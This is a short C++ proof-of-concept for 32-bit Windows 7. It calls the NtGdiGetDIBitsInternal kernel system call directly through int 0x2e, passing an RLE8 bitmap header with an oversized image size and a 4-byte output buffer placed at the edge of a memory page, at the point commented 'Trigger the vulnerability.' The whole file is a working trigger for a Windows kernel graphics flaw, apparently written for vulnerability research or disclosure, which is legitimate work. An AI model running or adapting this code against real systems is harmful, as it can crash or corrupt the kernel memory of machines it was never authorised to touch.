#include <Windows.h>
#include <assert.h>

// For native 32-bit execution.
extern "C"
ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
  __asm{mov eax, ApiNumber};
  __asm{lea edx, ApiNumber + 4};
  __asm{int 0x2e};
}

int main() {
  // Windows 7 32-bit.
  CONST ULONG __NR_NtGdiGetDIBitsInternal = 0x10b3;

  // Initialize the graphic subsystem for this process.
  LoadLibraryA("gdi32.dll");

  // Load an external bitmap as HBITMAP and select it in the device context.
  HDC hdc = CreateCompatibleDC(NULL);
  HBITMAP hbmp = (HBITMAP)LoadImage(NULL, L"test.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

  assert(hdc != NULL);
  assert(hbmp != NULL);

  SelectObject(hdc, hbmp);

  // Allocate a 4-byte buffer for the output data.
  LPBYTE lpNewRegion = (LPBYTE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  assert(lpNewRegion != NULL);

  memset(lpNewRegion, 0xcc, 0x1000);
  LPBYTE output_buffer = &lpNewRegion[0xffc];

  // Trigger the vulnerability.
  BITMAPINFOHEADER bmi = { sizeof(BITMAPINFOHEADER), // biSize
                           100,                      // biWidth
                           100,                      // biHeight
                           1,                        // biPlanes
                           8,                        // biBitcount
                           BI_RLE8,                  // biCompression
                           0x10000000,               // biSizeImage
                           0,                        // biXPelsPerMeter
                           0,                        // biYPelsPerMeter
                           0,                        // biClrUsed
                           0,                        // biClrImportant
  };

  SystemCall32(__NR_NtGdiGetDIBitsInternal,
               hdc,
               hbmp,
               0,
               1,
               output_buffer,
               &bmi,
               DIB_RGB_COLORS,
               1,
               sizeof(bmi)
              );

  return 0;
}
